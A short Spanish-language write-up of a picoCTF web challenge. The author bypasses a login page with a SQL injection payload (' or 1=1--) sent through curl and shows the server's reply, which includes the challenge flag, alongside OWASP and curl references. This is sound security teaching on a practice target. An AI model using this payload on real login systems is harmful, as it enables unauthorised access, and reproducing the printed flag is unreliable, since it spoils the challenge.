### **Descripción**

Hay un sitio web que se ejecuta en [enlace](https://jupiter.challenges.picoctf.org/problem/50009/) o `http://jupiter.challenges.picoctf.org:50009`. ¿Crees que puedes iniciar sesión con nosotros? ¡Intenta ver si puedes iniciar sesión!

---

### **Proceso**

#### **1. Análisis inicial del sitio**

Intenté acceder al sitio web y observé que contenía una página de inicio de sesión (`login.php`).

#### **2. Prueba de inyección SQL**

Dado que muchos sistemas de autenticación son vulnerables a inyecciones SQL, intenté iniciar sesión usando un payload común para omitir la autenticación:

`curl "https://jupiter.challenges.picoctf.org/problem/50009/login.php" --data "username=admin&password='+or+1=1--"`

#### **3. Respuesta del servidor**

La página respondió con el siguiente mensaje:

`<h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}</p>`

Esto confirma que la aplicación es vulnerable a una inyección SQL y que la autenticación fue omitida con éxito.

---

### **Referencias**

1. OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
    
2. Uso de `curl` para peticiones HTTP: https://curl.se/docs/manpage.html